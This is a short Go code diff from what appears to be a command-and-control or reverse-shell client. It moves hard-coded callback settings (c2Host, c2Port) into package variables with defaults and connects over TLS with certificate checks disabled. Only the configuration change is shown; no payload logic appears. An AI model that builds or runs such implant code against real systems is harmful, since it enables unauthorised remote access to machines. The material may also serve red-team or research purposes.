@@ -9,9 +9,18 @@ import (
 	"strings"
 )
 
+var defaultHost = "127.0.0.1"
+var defaultPort = "9001"
+
+var c2Host string
+var c2Port string
+
+func init() {
+	c2Host = defaultHost
+	c2Port = defaultPort
+}
+
 func main() {
-	c2Host := "192.168.0.4" // Change This
-	c2Port := "443"         // Change This
 	address := net.JoinHostPort(c2Host, c2Port)
 	conf := &tls.Config{
 		InsecureSkipVerify: true,
